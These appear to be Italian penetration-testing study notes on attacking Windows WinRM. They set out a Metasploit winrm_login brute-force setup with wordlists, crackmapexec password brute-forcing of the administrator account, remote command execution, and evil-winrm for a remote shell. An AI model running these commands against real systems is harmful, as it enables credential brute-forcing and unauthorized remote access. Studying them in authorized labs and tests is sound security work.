- WinRM è un protocollo di gestione remota di Windows.
- Usato per accedere e gestire sistemi Windows su una rete locale come:
    - Accesso remoto e interazione con host Windows su una rete locale.
    - Accesso remoto ed esecuzione di comandi su sistemi Windows.
    - Gestire e configurare i sistemi Windows da remoto.
- Di solito utilizza le porte TCP 5985 e 5986.
- WinRM implementa controlli di accesso e sicurezza tramite varie forme di autenticazione.
- Si può utilizzare **crackmapexec** per eseguire un brute-force su WinRM.
- Si può anche utilizzare **evil-winrm** per ottenere una shell di comando sul sistema target.

### EXPLOIT

### Metodo Automatico

- **use auxiliary/scanner/winrm/winrm_login** ottiene shell meterpreter
    - set RHOSTS ****
    - set USER_FILE ****/usr/share/metasploit-framework/data/wordlists/common_users.txt
    - set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
    - set VERBOSE false

### Metodo manuale

Verificata la presenza della porta aperta utilizziamo crackmapexec (CME), un tools molto utilizzato nei pentest che permette di eseguire bruteforce, enumerazione, laterla movement di alcuni protocolli.

1. **crackmapexec** avviamo il programma
2. **crackmapexec winrm IP_TARGET -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt** 
    1. **administrator** Utilizziamo administrator in quanto viene creato automaticamente da windows ed utilizzato per il settaggio delle impostazioni iniziali
3. **crackmapexec winrm IP_TARGET -u administrator -p PASSWORD -x “COMANDO”**
    1. **COMANDO** qui si inseriscono i comandi che poi verranno lanciati da CME
4. **evil-winrm -u administrator -p PASSWORD -i IP_TARGET** tools che permette di ottenere una shell tramite WinRM
